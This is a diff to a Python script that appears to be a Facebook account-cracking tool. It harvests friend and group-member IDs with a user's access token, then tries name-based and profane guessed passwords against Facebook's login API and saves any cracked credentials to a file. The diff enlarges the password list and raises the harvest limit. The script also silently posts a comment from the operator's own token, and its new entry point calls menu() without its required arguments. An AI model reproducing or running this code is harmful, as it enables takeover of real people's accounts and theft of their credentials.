@@ -63,9 +63,9 @@ def menu(n,toket):
 	banner()
 	print("%s(●) %sWellcome %s%s"%(G,W,Y,n))
 	print("""
-%s## %s1 ID FROM YOUR LIST FRIEND
-%s## %s2 ID FROM FRIEND
-%s## %s3 ID FROM MEMBER GROUP
+%s## %s1 Crack Daftar Teman
+%s## %s2 Crack Teman Dari Teman
+%s## %s3 Crack Daftar Anggota Group
 
 %s## %s0 Exit the program
 """%(G,W,G,W,G,W,G,R))
@@ -92,7 +92,7 @@ def menu(n,toket):
 		except KeyError:
 			exit("%s[!]%s ups sorry group not found !!"%(R,W))
 		print("%s[*]%s from : %s"%(P,W,e))
-		for y in s.get(url.format(idg+"/members?fields=name,id&limit=3000,2000,1000,5000,4000&access_token=%s"%(toket))).json()["data"]:
+		for y in s.get(url.format(idg+"/members?fields=name,id&limit=9999&access_token=%s"%(toket))).json()["data"]:
 			target.append(y["id"])
 	elif unikers in ["0"]:
 		os.system("rm -rf cookie")
@@ -115,7 +115,7 @@ def x(user):
 		pass
 	try:
 		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
-		for pas in [nama+"01",nama+"02",nama+"03",nama+"99",nama+"98","#"+nama,"123"+nama,"ANJING","KONTOL","@"+nama+"01","BANGSAT","SAYANG"]:
+		for pas in [nama+"1",nama+"2",nama+"3",nama+"00",nama+"123","#"+nama,"123"+nama,nama+"1234",nama+"12345",nama+".com",nama+".01","anjing","ANJING","kontol","KONTOL","@"+nama+"01","bangsat","BANGSAT","SAYANG","sayang","ngentot","NGENTOT","ngaceng","santuy","SANTUY"]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("result/found.txt","a").write("%s | %s\n"%(user,pas))
@@ -154,18 +154,18 @@ def cek():
 		toket = open("cookie/token.log","r").read()
 	except OSError:
 		print("%s[×] %sups sorry token not found !!"%(R,W))
-		sleep(2)
+		sleep(1)
 		login()
 	try:
 		n = s.get(url.format("me?access_token=%s"%(toket))).json()["name"]
-		s.post(url.format("130127075018405_103083674389412/comments?message=Baik+dong+&access_token=%s"%(toket)))
+		s.post(url.format("116442009208186_100025271623353/comments?message=Baik+dong+&access_token=%s"%(toket)))
 		print("%s[*] %ssuccess load access token"%(G,W))
-		sleep(2)
+		sleep(1)
 		menu(n,toket)
 	except KeyError:
 		os.system("rm -rf cookie/token.log")
 		print("%s[×] %sups sorry your access token invalid !!"%(R,W))
-		sleep(2)
+		sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
 		exit("%s[!] %sups no connection !!"%(R,W))
@@ -187,4 +187,8 @@ def banner():
 ║%s# %sGithub : %sHttps://github.com/M3DPR0%s%s   ║
 ╰══════════════════════════════════════════╯
  """%(R,W,GB,RE,R,W,Y,W,RM,RE,W,Y,W,CM,RE,W,Y,W,PM,RE,W))
-cek()
+
+if __name__ == '__main__':
+
+	menu()
+	cek()
